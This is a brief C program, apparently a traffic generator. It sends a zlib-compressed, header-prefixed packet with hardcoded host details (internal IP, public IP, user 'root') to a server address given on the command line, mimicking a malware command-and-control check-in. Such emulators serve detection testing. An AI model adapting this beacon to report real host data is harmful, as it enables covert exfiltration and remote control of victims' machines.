#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <zlib.h>
int main(int argc, char *argv[])
{
    const char *a=argv[1];
    unsigned char m[1024];
    unsigned long c=1024;
    compress(m,&c,"a1192.168.1.1|8.8.8.8|root||",28);
    unsigned char h[] = {0x0d,0x0f,0x3e,0x03,0x4a,0x00,0x00,0x00};
    unsigned char d[1024];
    memcpy(d,h,8);
    memcpy(d+8,m,c);
    int s=socket(AF_INET,SOCK_STREAM,0);
    if (s < 0) {
        return 1;
    }
    struct sockaddr_in v;
    memset(&v,0,sizeof(v));
    v.sin_family=AF_INET;
    v.sin_port=htons(80);
    if (inet_pton(AF_INET,a,&v.sin_addr)!=1) {
        close(s);
        return 1;
    }
    if (connect(s,(struct sockaddr *)&v, sizeof(v))<0) {
        close(s);
        return 1;
    }
    send(s,d,8+c,0);
    close(s);
    return 0;
}
